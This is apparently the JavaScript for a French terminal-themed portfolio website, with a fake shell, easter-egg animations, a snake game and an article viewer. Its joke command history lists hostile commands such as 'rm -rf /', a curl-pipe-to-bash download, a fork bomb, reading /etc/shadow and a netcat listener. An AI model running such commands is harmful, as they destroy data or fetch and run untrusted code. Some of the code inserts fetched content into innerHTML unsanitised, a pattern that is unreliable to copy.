document.addEventListener('DOMContentLoaded', () => {
    new Terminal();

    // Gestionnaires pour la page d'aide
    document.getElementById('help-link').addEventListener('click', (e) => {
        e.preventDefault();
        document.getElementById('help-overlay').style.display = 'block';
    });

    document.querySelector('.close-help').addEventListener('click', () => {
        document.getElementById('help-overlay').style.display = 'none';
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            document.getElementById('help-overlay').style.display = 'none';
        }
    });

    // Gestionnaires pour la section recipes
    document.getElementById('recipes-link').addEventListener('click', (e) => {
        e.preventDefault();
        document.querySelector('.terminal-container').style.display = 'none';
        document.getElementById('recipes-page').style.display = 'block';
        loadRecipes();
    });

    document.querySelector('.back-button').addEventListener('click', () => {
        document.getElementById('recipes-page').style.display = 'none';
        document.querySelector('.terminal-container').style.display = 'flex';
        document.getElementById('terminal-input').focus();
    });

    // Gestionnaire pour les catégories
    document.querySelectorAll('.category').forEach(button => {
        button.addEventListener('click', () => {
            document.querySelectorAll('.category').forEach(b => b.classList.remove('active'));
            button.classList.add('active');
            loadRecipes(button.dataset.category);
        });
    });
});

window.copyCode = function(button) {
    const codeBlock = button.closest('.code-block');
    const code = codeBlock.querySelector('code').textContent;
    
    navigator.clipboard.writeText(code).then(() => {
        button.textContent = 'Copié !';
        button.classList.add('copied');
        
        setTimeout(() => {
            button.textContent = 'Copier';
            button.classList.remove('copied');
        }, 2000);
    }).catch(err => {
        console.error('Erreur lors de la copie:', err);
        button.textContent = 'Erreur !';
        setTimeout(() => {
            button.textContent = 'Copier';
        }, 2000);
    });
};

window.copyCommand = function(command) {
    navigator.clipboard.writeText(command).then(() => {
        // Créer une notification temporaire
        const notification = document.createElement('div');
        notification.className = 'copy-notification';
        notification.textContent = 'Commande copiée !';
        document.body.appendChild(notification);
        
        // Supprimer la notification après 2 secondes
        setTimeout(() => {
            notification.remove();
        }, 2000);
    });
};

class Shell {
    constructor() {
        this.commands = {
            ls: {
                exec: (args) => this.ls(args),
                help: "Liste les fichiers"
            },
            cat: {
                exec: (args) => this.cat(args),
                help: "Affiche le contenu d'un fichier",
                usage: "cat [fichier]"
            },
            clear: {
                exec: () => this.clear(),
                help: "Efface l'écran"
            },
            help: {
                exec: () => this.help(),
                help: "Affiche l'aide"
            },
            payload: {
                exec: () => this.payload(),
                help: "Exécute le payload visuel"
            },
            matrix: {
                exec: () => this.matrix(),
                help: "???"
            },
            hack: {
                exec: () => this.hack(),
                help: "???"
            },
            snake: {
                exec: () => this.snake(),
                help: "???"
            },
            history: {
                exec: () => this.history(),
                help: "Affiche l'historique des commandes"
            },
            open: {
                exec: (args) => this.open(args),
                help: "Ouvre un fichier dans un terminal séparé",
                usage: "open [fichier]"
            }
        };

        this.fileSystem = {
            'welcome.txt': null,
            'cv.txt': null,
            'certifications.txt': null,
            'competences.txt': null,
            'contact.txt': null,
            'chat.png': null
        };

        // Ajouter le faux historique
        this.fakeHistory = [
            "sudo rm -rf /",
            "cd /root",
            "Access Denied... bien tenté ;)",
            "nmap -sS -sV 127.0.0.1",
            "Scanning localhost... vraiment ?",
            "ssh root@mainframe",
            "Nice try!",
            "msfconsole",
            "Metasploit? Classique...",
            "ping 8.8.8.8",
            "Google te voit...",
            "cat /etc/shadow",
            "Permission denied (évidemment)",
            "whoami",
            "Tu ne le sais pas ?",
            "sudo su",
            "Pas de sudo pour toi !",
            "curl http://totally-legit-site.com/definitely-not-a-virus.sh | bash",
            "Sérieusement ?",
            "./hack_the_planet.sh",
            "Tu regardes trop Mr. Robot",
            "echo 'Je suis un hacker' > skills.txt",
            "Wow, impressionnant...",
            ":(){ :|:& };:",
            "Fork bomb évitée, bien essayé !",
            "telnet towel.blinkenlights.nl",
            "Star Wars en ASCII? Un autre jour peut-être",
            "sl",
            "Tchou tchou! 🚂",
            "cd /dev/null",
            "Tu essaies d'aller nulle part ?",
            "sudo apt-get install girlfriend",
            "Package 'girlfriend' not found",
            "ping -c 1 google.com | grep 'bytes from' | cut -d = -f 4",
            "Ping complexe... pour impressionner qui ?",
            "curl parrot.live",
            "Party parrot! 🦜",
            "nc -lvp 4444",
            "En attente de connexion... pour toujours",
            "hydra -l admin -P rockyou.txt localhost",
            "Bruteforce sur localhost... vraiment ?",
            "john password.txt",
            "John the Ripper sur un fichier vide",
            "strings brain.dump",
            "404 Brain not found"
        ];

        this.loadFiles();
    }

    async loadFiles() {
        const promises = [];
        console.log('Chargement des fichiers...');
        for (const filename of Object.keys(this.fileSystem)) {
            try {
                if (filename.endsWith('.png')) {
                    // Pour les images, on stocke juste le chemin
                    this.fileSystem[filename] = `content/${filename}`;
                    console.log(`Image chargée: ${filename}`);
                } else {
                    // Pour les fichiers texte, on charge le contenu
                    const promise = fetch(`content/${filename}`)
                        .then(response => {
                            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                            return response.text();
                        })
                        .then(content => {
                            this.fileSystem[filename] = content;
                            console.log(`Fichier chargé: ${filename}`);
                        })
                        .catch(error => {
                            console.error(`Erreur lors du chargement de ${filename}:`, error);
                        });
                    promises.push(promise);
                }
            } catch (error) {
                console.error(`Erreur lors du chargement de ${filename}:`, error);
            }
        }
        return Promise.all(promises);
    }

    execute(input) {
        const parts = input.trim().split(/\s+/);
        const command = parts[0].toLowerCase();
        const args = parts.slice(1);
        
        if (this.commands[command]) {
            return this.commands[command].exec(args);
        } else {
            return `Commande non trouvée: '${command}'. Tapez 'help' pour voir les commandes disponibles.`;
        }
    }

    ls() {
        return Object.keys(this.fileSystem)
            .map(name => `📄 ${name}`)
            .join('\n');
    }

    cat(args) {
        if (args.length === 0) return 'Usage: cat [fichier]';
        const filename = args[0];
        
        if (this.fileSystem[filename] !== undefined) {
            let content = this.fileSystem[filename];
            
            // Si c'est le fichier contact.txt, on traite les liens
            if (filename === 'contact.txt') {
                const lines = content.split('\n');
                const processedLines = lines.map(line => {
                    // Traitement pour l'email
                    if (line.includes('Email:')) {
                        const email = line.match(/Email: (.+)/)[1];
                        return `Email: <a href="mailto:${email}" class="terminal-link">${email}</a>`;
                    }
                    // Traitement pour GitHub
                    else if (line.includes('GitHub:')) {
                        const url = line.match(/GitHub: (.+)/)[1];
                        return `GitHub: <a href="${url}" target="_blank" class="terminal-link">${url}</a>`;
                    }
                    // Traitement pour LinkedIn
                    else if (line.includes('LinkedIn:')) {
                        const url = line.match(/LinkedIn: (.+)/)[1];
                        return `LinkedIn: <a href="${url}" target="_blank" class="terminal-link">${url}</a>`;
                    }
                    return line;
                });
                return processedLines.join('\n');
            }
            
            return content;
        } else {
            return `Fichier non trouvé: ${filename}`;
        }
    }

    clear() {
        document.getElementById('terminal-content').innerHTML = '';
        return '';
    }

    help() {
        return Object.entries(this.commands)
            .map(([name, cmd]) => {
                const usage = cmd.usage ? cmd.usage : name;
                return `${usage.padEnd(15)} - ${cmd.help}`;
            })
            .join('\n');
    }

    history() {
        const shuffled = [...this.fakeHistory]
            .sort(() => Math.random() - 0.5)
            .slice(0, 10);
        
        const realCommands = this.terminal?.commandHistory || [];
        const recentReal = realCommands.slice(-5);

        return shuffled
            .concat(recentReal)
            .map((cmd, i) => `${(i + 1).toString().padStart(4)}  ${cmd}`)
            .join('\n');
    }

    open(args) {
        if (args.length === 0) return 'Usage: open [fichier]';
        const filename = args[0];
        
        if (this.fileSystem[filename] !== undefined) {
            const secondTerminal = document.getElementById('second-terminal');
            const fileContent = document.getElementById('file-content');
            
            // Vérifier si c'est une image PNG
            if (filename.toLowerCase().endsWith('.png')) {
                fileContent.innerHTML = '';
                const img = document.createElement('img');
                img.src = this.fileSystem[filename];
                img.style.maxWidth = '100%';
                img.style.height = 'auto';
                img.style.display = 'block';
                img.style.margin = '0 auto';
                fileContent.appendChild(img);
            } else {
                fileContent.textContent = this.fileSystem[filename];
            }
            
            secondTerminal.style.display = 'flex';
            secondTerminal.style.opacity = '0';
            secondTerminal.style.transform = 'translateX(20px)';
            
            requestAnimationFrame(() => {
                secondTerminal.style.transition = 'all 0.3s ease-out';
                secondTerminal.style.opacity = '1';
                secondTerminal.style.transform = 'translateX(0)';
            });

            return `Ouverture de ${filename} dans le terminal secondaire...`;
        } else {
            return `Fichier non trouvé: ${filename}`;
        }
    }

    payload() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const canvas2 = document.createElement('canvas'); 
        const ctx2 = canvas2.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas2.width = canvas.width;
        canvas2.height = canvas.height;

        const initOffsets = (w, max) => {
            const offsets = [];
            offsets[0] = -(Math.random() * max);
            
            for (let i = 1; i < w; i++) {
                if (i % 24 === 0) {
                    const r = (Math.random() * 48) - 24;
                    const blockOffset = offsets[i-1] + r;
                    for (let j = 0; j < 24 && i+j < w; j++) {
                        offsets[i+j] = blockOffset;
                    }
                } else {
                    offsets[i] = offsets[i-1];
                }
                
                if (offsets[i] > 0) {
                    offsets[i] = -(Math.random() * max * 3);
                }
            }
            return offsets;
        };

        html2canvas(document.body).then(capturedCanvas => {
            const meltEffect = document.createElement('div');
            meltEffect.className = 'melt-effect';
            meltEffect.appendChild(canvas2);
            document.body.appendChild(meltEffect);

            const warningMsg = document.createElement('div');
            warningMsg.className = 'warning-message';
            warningMsg.innerHTML = `
                <span class="blink">! AVERTISSEMENT !</span><br>
                SYSTÈME COMPROMIS<br>
                CORRUPTION MÉMOIRE DÉTECTÉE
            `;
            meltEffect.appendChild(warningMsg);

            let offsets = initOffsets(canvas.width/2, 30);
            const startingImage = capturedCanvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height);
            ctx.putImageData(startingImage, 0, 0);

            const animate = () => {
                const frameBuffer = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const newBuffer = new Uint8ClampedArray(frameBuffer.data.length);

                for (let x = 0; x < canvas.width/2; x++) {
                    const isMelting = offsets[x] > 0;
                    const tx = x * 2;
                    for (let y = canvas.height-1; y > offsets[x]; y--) {
                        const sy = isMelting ? y-4 : y;
                        const di = (y * canvas.width + tx) * 4;
                        const si = (sy * canvas.width + tx) * 4;
                        for (let i = 0; i < 4; i++) {
                            newBuffer[di + i] = frameBuffer.data[si + i];
                            newBuffer[di + 4 + i] = frameBuffer.data[si + 4 + i];
                        }
                    }
                    offsets[x] += 2;

                    if (offsets[x] >= canvas.height) {
                        offsets[x] = -(Math.random() * 100);
                    }
                }

                ctx.putImageData(new ImageData(newBuffer, canvas.width, canvas.height), 0, 0);
                ctx2.drawImage(canvas, 0, 0, canvas2.width, canvas2.height);

                requestAnimationFrame(animate);
            };

            animate();
        });
    }

    matrix() {
        const chars = "日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ";
        const streams = [];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.zIndex = '9999';
        document.body.appendChild(canvas);

        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#0F0';
        ctx.font = '15px monospace';

        for(let i = 0; i < canvas.width/20; i++) {
            streams.push({
                x: i * 20,
                y: Math.random() * canvas.height,
                speed: Math.random() * 3 + 1
            });
        }

        const animate = () => {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0F0';

            streams.forEach(stream => {
                ctx.fillText(chars[Math.floor(Math.random() * chars.length)], 
                            stream.x, stream.y);
                stream.y += stream.speed;
                if(stream.y > canvas.height) stream.y = 0;
            });

            requestAnimationFrame(animate);
        };

        animate();

        const stopButton = document.createElement('button');
        stopButton.className = 'easter-egg-button';
        stopButton.textContent = 'Sortir';
        stopButton.onclick = () => {
            document.body.removeChild(canvas);
            document.body.removeChild(stopButton);
        };
        document.body.appendChild(stopButton);
    }

    async hack() {
        const steps = [
            "Initialisation du protocole d'intrusion...",
            "Scan des ports en cours...",
            "Vulnérabilité détectée sur le port 443...",
            "Injection de payload...",
            "Contournement du firewall...",
            "Accès root obtenu !",
            "Téléchargement des données...",
            "Nettoyage des traces...",
            "[!] Hack terminé avec succès !"
        ];

        let result = '';
        for(const step of steps) {
            await new Promise(r => setTimeout(r, 1000));
            result += `[+] ${step}\n`;
            this.onOutput?.(result);
        }
        return result;
    }

    snake() {
        const secondTerminal = document.getElementById('second-terminal');
        const fileContent = document.getElementById('file-content');
        
        fileContent.innerHTML = '';
        fileContent.style.whiteSpace = 'normal';
        
        // Créer un conteneur pour centrer le jeu et les instructions
        const gameContainer = document.createElement('div');
        gameContainer.style.cssText = `
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            overflow: hidden;
            padding: 20px;
            box-sizing: border-box;
        `;
        
        // Créer un wrapper pour les instructions
        const instructionsWrapper = document.createElement('div');
        instructionsWrapper.style.cssText = `
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
        `;
        
        // Ajouter les instructions
        instructionsWrapper.innerHTML = `
            <div style="color: var(--text-blue); margin: 0 auto;">
                Appuyez sur une flèche pour commencer<br>
                Score: <span id="snake-score">0</span><br>
                <button id="restart-snake" style="
                    margin-top: 10px;
                    background: var(--medium-gray);
                    border: 1px solid var(--cyber-blue);
                    color: var(--light-gray);
                    padding: 5px 15px;
                    border-radius: 4px;
                    cursor: pointer;
                    display: none;
                ">Rejouer</button>
            </div>
        `;

        // Modifier le style du canvasWrapper
        const canvasWrapper = document.createElement('div');
        canvasWrapper.style.cssText = `
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            position: relative;
        `;

        // Créer le canvas
        const canvas = document.createElement('canvas');
        canvas.width = 300;
        canvas.height = 300;
        canvas.style.cssText = `
            border: 2px solid var(--main-blue);
            background-color: rgba(0, 0, 0, 0.8);
            display: block;
        `;
        
        // Assembler les éléments
        canvasWrapper.appendChild(canvas);
        gameContainer.appendChild(canvasWrapper);
        gameContainer.appendChild(instructionsWrapper);
        fileContent.appendChild(gameContainer);
        
        // Afficher le second terminal
        secondTerminal.style.display = 'flex';
        secondTerminal.style.opacity = '0';
        secondTerminal.style.transform = 'translateX(20px)';
        
        requestAnimationFrame(() => {
            secondTerminal.style.transition = 'all 0.3s ease-out';
            secondTerminal.style.opacity = '1';
            secondTerminal.style.transform = 'translateX(0)';
        });

        // Ajuster la taille des blocs pour le nouveau canvas
        const blockSize = 15; // Plus petit que 20
        const gridSize = 20; // Garder le même nombre de cases

        const ctx = canvas.getContext('2d');
        const snake = [{x: 10, y: 10}];
        let food = {x: 15, y: 15};
        let dx = 1, dy = 0;
        let gameLoop = null;
        let score = 0;
        let gameOver = false;
        let gameStarted = false;  // Nouvelle variable pour l'état du jeu

        const endGame = () => {
            gameOver = true;
            ctx.fillStyle = 'var(--main-blue)';
            ctx.font = '30px monospace';
            ctx.textAlign = 'center';
            ctx.fillText('Game Over!', canvas.width/2, canvas.height/2);
            ctx.fillText(`Score: ${score}`, canvas.width/2, canvas.height/2 + 40);
            
            // Afficher le bouton de redémarrage
            const restartButton = document.getElementById('restart-snake');
            restartButton.style.display = 'inline-block';
            
            // Ajouter l'événement de redémarrage
            restartButton.onclick = () => {
                snake.length = 1;
                snake[0] = {x: 10, y: 10};
                food = {x: 15, y: 15};
                dx = 1;
                dy = 0;
                score = 0;
                gameOver = false;
                gameStarted = false;  // Réinitialiser l'état de démarrage
                document.getElementById('snake-score').textContent = '0';
                restartButton.style.display = 'none';
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                // Remettre le message initial
                instructionsWrapper.innerHTML = `
                    <div style="color: var(--text-blue); margin: 0 auto;">
                        Appuyez sur une flèche pour commencer<br>
                        Score: <span id="snake-score">0</span><br>
                        <button id="restart-snake" style="
                            margin-top: 10px;
                            background: var(--medium-gray);
                            border: 1px solid var(--cyber-blue);
                            color: var(--light-gray);
                            padding: 5px 15px;
                            border-radius: 4px;
                            cursor: pointer;
                            display: none;
                        ">Rejouer</button>
                    </div>
                `;
            };
        };

        const handleKeyDown = (e) => {
            if (gameOver) return;
            
            // Si le jeu n'a pas commencé, le démarrer à la première touche
            if (!gameStarted && ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
                gameStarted = true;
                instructionsWrapper.innerHTML = `
                    <div style="color: var(--text-blue); margin: 0 auto;">
                        Utilisez les flèches du clavier pour jouer<br>
                        Score: <span id="snake-score">0</span><br>
                        <button id="restart-snake" style="
                            margin-top: 10px;
                            background: var(--medium-gray);
                            border: 1px solid var(--cyber-blue);
                            color: var(--light-gray);
                            padding: 5px 15px;
                            border-radius: 4px;
                            cursor: pointer;
                            display: none;
                        ">Rejouer</button>
                    </div>
                `;
            }

            switch(e.key) {
                case 'ArrowUp': if(dy !== 1) {dx = 0; dy = -1;} break;
                case 'ArrowDown': if(dy !== -1) {dx = 0; dy = 1;} break;
                case 'ArrowLeft': if(dx !== 1) {dx = -1; dy = 0;} break;
                case 'ArrowRight': if(dx !== -1) {dx = 1; dy = 0;} break;
            }
        };

        document.addEventListener('keydown', handleKeyDown);

        gameLoop = setInterval(() => {
            if (gameOver || !gameStarted) return;  // Ne pas mettre à jour si le jeu n'a pas commencé

            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            const head = {x: snake[0].x + dx, y: snake[0].y + dy};
            
            if(head.x < 0 || head.x >= 20 || head.y < 0 || head.y >= 20 || 
               snake.some(part => part.x === head.x && part.y === head.y)) {
                endGame();
                return;
            }

            snake.unshift(head);
            
            if(head.x === food.x && head.y === food.y) {
                score += 10;
                document.getElementById('snake-score').textContent = score;
                food = {
                    x: Math.floor(Math.random() * 20),
                    y: Math.floor(Math.random() * 20)
                };
            } else {
                snake.pop();
            }
            
            ctx.fillStyle = 'var(--main-blue)';
            snake.forEach(part => {
                ctx.fillRect(part.x * blockSize, part.y * blockSize, blockSize - 1, blockSize - 1);
            });
            
            ctx.fillStyle = '#FF0000';
            ctx.beginPath();
            ctx.arc(food.x * blockSize + blockSize/2, food.y * blockSize + blockSize/2, blockSize/2 - 1, 0, Math.PI * 2);
            ctx.fill();
        }, 100);

        // Nettoyer quand le terminal est fermé
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.target.style.display === 'none') {
                    clearInterval(gameLoop);
                    document.removeEventListener('keydown', handleKeyDown);
                    fileContent.style.whiteSpace = 'pre';
                    observer.disconnect();
                }
            });
        });

        observer.observe(secondTerminal, { attributes: true, attributeFilter: ['style'] });

        return 'Lancement du jeu Snake dans le terminal secondaire...';
    }
}

class Terminal {
    constructor() {
        this.shell = new Shell();
        this.shell.terminal = this;
        this.commandHistory = [];
        this.historyIndex = -1;
        this.input = document.getElementById('terminal-input');
        this.content = document.getElementById('terminal-content');
        this.suggestions = [];
        this.suggestionIndex = -1;
        
        this.input.addEventListener('keydown', this.handleKeyDown.bind(this));
        this.input.addEventListener('input', this.handleInput.bind(this));
        this.input.addEventListener('blur', () => {
            setTimeout(() => this.input.focus(), 10);
        });

        this.input.focus();

        document.querySelector('.terminal').addEventListener('click', () => {
            this.input.focus();
        });

        this.shell.loadFiles().then(() => {
            this.displayWelcome();
        });
    }

    displayWelcome() {
        const welcomeContent = this.shell.fileSystem['welcome.txt'];
        if (welcomeContent) {
            this.addToContent(welcomeContent);
        }
    }

    handleInput(event) {
        this.suggestionIndex = -1;
        this.suggestions = [];
    }

    handleKeyDown(event) {
        if (event.key === 'Tab') {
            event.preventDefault();
            this.handleTabCompletion();
        } else if (event.key === 'Enter') {
            event.preventDefault();
            const command = this.input.value;
            this.executeCommand(command);
            this.input.value = '';
            this.historyIndex = -1;
            if (command.trim()) {
                this.commandHistory.push(command);
            }
        } else if (event.key === 'ArrowUp') {
            event.preventDefault();
            if (this.historyIndex < this.commandHistory.length - 1) {
                this.historyIndex++;
                this.input.value = this.commandHistory[this.commandHistory.length - 1 - this.historyIndex];
            }
        } else if (event.key === 'ArrowDown') {
            event.preventDefault();
            if (this.historyIndex > 0) {
                this.historyIndex--;
                this.input.value = this.commandHistory[this.commandHistory.length - 1 - this.historyIndex];
            } else {
                this.historyIndex = -1;
                this.input.value = '';
            }
        }
    }

    handleTabCompletion() {
        const input = this.input.value;
        const [cmd, ...args] = input.trim().split(/\s+/);
        
        if (!args.length) {
            if (this.suggestions.length === 0) {
                this.suggestions = Object.keys(this.shell.commands).filter(c => 
                    c.startsWith(cmd)
                );
            }

            if (this.suggestions.length === 1) {
                this.input.value = this.suggestions[0] + ' ';
                this.suggestions = [];
            } else if (this.suggestions.length > 1) {
                this.suggestionIndex = (this.suggestionIndex + 1) % this.suggestions.length;
                this.input.value = this.suggestions[this.suggestionIndex] + ' ';
                
                if (this.suggestionIndex === 0) {
                    const suggestionsDisplay = this.suggestions.join('  ');
                    this.addToContent(suggestionsDisplay);
                }
            }
        } else {
            const lastArg = args[args.length - 1];
            if (this.suggestions.length === 0) {
                this.suggestions = Object.keys(this.shell.fileSystem).filter(f => 
                    f.startsWith(lastArg)
                );
            }

            if (this.suggestions.length === 1) {
                const newArgs = [...args.slice(0, -1), this.suggestions[0]];
                this.input.value = `${cmd} ${newArgs.join(' ')}`;
                this.suggestions = [];
            } else if (this.suggestions.length > 1) {
                this.suggestionIndex = (this.suggestionIndex + 1) % this.suggestions.length;
                const newArgs = [...args.slice(0, -1), this.suggestions[this.suggestionIndex]];
                this.input.value = `${cmd} ${newArgs.join(' ')}`;
                
                if (this.suggestionIndex === 0) {
                    const suggestionsDisplay = this.suggestions.join('  ');
                    this.addToContent(suggestionsDisplay);
                }
            }
        }
    }

    executeCommand(command) {
        const prompt = document.createElement('div');
        prompt.className = 'command-prompt';
        prompt.textContent = `alex@portfolio:~$ ${command}`;
        this.content.appendChild(prompt);

        if (command.trim()) {
            const result = this.shell.execute(command);
            if (result instanceof Promise) {
                this.input.disabled = true;
                
                this.shell.onOutput = (text) => {
                    const output = document.createElement('div');
                    output.className = 'command-output';
                    output.style.whiteSpace = 'pre';
                    output.textContent = text;
                    const oldOutput = prompt.nextSibling;
                    if (oldOutput?.className === 'command-output') {
                        this.content.removeChild(oldOutput);
                    }
                    this.content.appendChild(output);
                    this.content.scrollTop = this.content.scrollHeight;
                };

                result.then(finalText => {
                    this.shell.onOutput = null;
                    this.input.disabled = false;
                    this.input.focus();
                });
            } else if (result) {
                this.addToContent(result);
            }
        }

        this.content.scrollTop = this.content.scrollHeight;
    }

    addToContent(text) {
        const output = document.createElement('div');
        output.className = 'command-output';
        
        if (text.includes('  ') && !text.includes('\n')) {
            output.style.columnCount = '3';
            output.style.columnGap = '20px';
            output.textContent = text;
        } else {
            output.style.whiteSpace = 'pre';
            output.innerHTML = text.trimEnd();
        }
        
        this.content.appendChild(output);
        this.content.scrollTop = this.content.scrollHeight;
    }
}

// Fonction pour charger les articles
async function loadRecipes(category = 'all') {
    const recipesList = document.querySelector('.recipes-list');
    try {
        const response = await fetch('content/recipes/index.json');
        const recipes = await response.json();
        
        const filteredRecipes = category === 'all' 
            ? recipes 
            : recipes.filter(recipe => recipe.category === category);

        recipesList.innerHTML = filteredRecipes.map(recipe => `
            <div class="recipe-card" data-file="${recipe.file}">
                <div class="recipe-title">${recipe.title}</div>
                <div class="recipe-meta">${recipe.date} �� ${recipe.readTime}</div>
                <div class="recipe-preview">${recipe.preview}</div>
                <div class="recipe-tags">
                    ${recipe.tags.map(tag => `<span class="recipe-tag">${tag}</span>`).join('')}
                </div>
                <div class="recipe-read-more">Lire la suite →</div>
            </div>
        `).join('');

        // Ajouter les event listeners pour les cartes
        document.querySelectorAll('.recipe-card').forEach(card => {
            card.addEventListener('click', async () => {
                const file = card.dataset.file;
                try {
                    const response = await fetch(`content/recipes/${file}`);
                    const content = await response.text();
                    showRecipeContent(content, card.querySelector('.recipe-title').textContent);
                } catch (error) {
                    console.error('Erreur lors du chargement de l\'article:', error);
                }
            });
        });
    } catch (error) {
        console.error('Erreur lors du chargement des recipes:', error);
        recipesList.innerHTML = 'Erreur lors du chargement des articles...';
    }
}

// Fonction pour afficher le contenu d'un article
function showRecipeContent(content, title) {
    const recipesPage = document.getElementById('recipes-page');
    const currentContent = recipesPage.querySelector('.recipes-content');
    
    // Configuration avancée de marked
    marked.setOptions({
        highlight: function(code, lang) {
            const lines = code.split('\n');
            const formattedLines = lines.map(line => {
                if (line.trim().startsWith('#')) {
                    // Extraire la commande (tout ce qui suit le #)
                    const command = line.substring(line.indexOf('#') + 1).trim();
                    // Échapper les caractères spéciaux
                    const escapedCommand = command.replace(/'/g, "\\'").replace(/"/g, '\\"');
                    return `<div class="command-line">
                        <span class="command-text">${line}</span>
                        <button class="copy-command" onclick="copyCommand('${escapedCommand}')">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>`;
                }
                return `<div class="command-line"><span class="command-text">${line}</span></div>`;
            });

            return `<div class="code-block">
                <div class="code-header">
                    <span>${lang || 'bash'}</span>
                    <button class="copy-button" onclick="copyCode(this)">Copier tout</button>
                </div>
                <pre>${formattedLines.join('\n')}</pre>
            </div>`;
        },
        breaks: true,
        gfm: true,
        headerIds: true,
        headerPrefix: 'heading-'
    });

    // Ajouter la fonction de copie
    function copyCode(button) {
        const codeBlock = button.closest('.code-block');
        const code = codeBlock.querySelector('code').textContent;
        
        navigator.clipboard.writeText(code).then(() => {
            // Effet visuel pour confirmer la copie
            button.textContent = 'Copié !';
            button.classList.add('copied');
            
            // Remettre le bouton à son état initial après 2 secondes
            setTimeout(() => {
                button.textContent = 'Copier';
                button.classList.remove('copied');
            }, 2000);
        }).catch(err => {
            console.error('Erreur lors de la copie:', err);
            button.textContent = 'Erreur !';
            setTimeout(() => {
                button.textContent = 'Copier';
            }, 2000);
        });
    }

    // Créer la vue article
    const articleView = document.createElement('div');
    articleView.className = 'article-content';
    articleView.innerHTML = `
        <div class="article-header">
            <button class="back-to-list">
                <i class="fas fa-arrow-left"></i> Retour
            </button>
            <h2>${title}</h2>
        </div>
        <div class="article-body">
            ${marked.parse(content)}
        </div>
    `;

    // Cacher le contenu actuel et montrer l'article
    currentContent.style.display = 'none';
    recipesPage.appendChild(articleView);

    // Gestionnaire pour le bouton retour
    articleView.querySelector('.back-to-list').addEventListener('click', () => {
        recipesPage.removeChild(articleView);
        currentContent.style.display = 'flex';
    });
}